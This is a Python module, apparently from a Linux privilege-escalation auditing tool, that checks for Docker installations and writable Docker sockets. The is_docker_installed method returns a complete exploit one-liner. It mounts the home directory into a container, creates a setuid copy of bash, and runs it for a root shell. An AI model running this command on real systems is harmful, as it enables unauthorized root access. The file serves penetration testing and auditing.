#!/usr/bin/env python
# -*- coding: utf-8 -*

import os

from .files.files import File

class Docker:
    """
    Docker misconfigurations
    """
    def __init__(self):

        self.sockets = [
            '/run/docker.sock',
            '/var/run/docker.sock'
        ]

    def is_docker_installed(self):
        """
        Check if docker service is present
        If present, could be used with gtfobins
            - https://gtfobins.github.io/gtfobins/docker/
        """
        if os.path.exists('/etc/init.d/docker'):
            return "/etc/init.d/docker found\n->docker run -v /home/${USER}:/h_docs \
                    ubuntu bash -c 'cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;' && ~/rootshell -p" 
        else:
            return False


    def find_mounted_socket(self, user):
        """
        List if a mounted docker socket has been found and if its path is writable
        """
        socks = []
        for socket in self.sockets:
            if os.path.exists(socket):
                socks.append({
                    'Sock': socket,
                    'Writable': "True" if File(socket).is_writable(user) else "False"
                })

        return socks
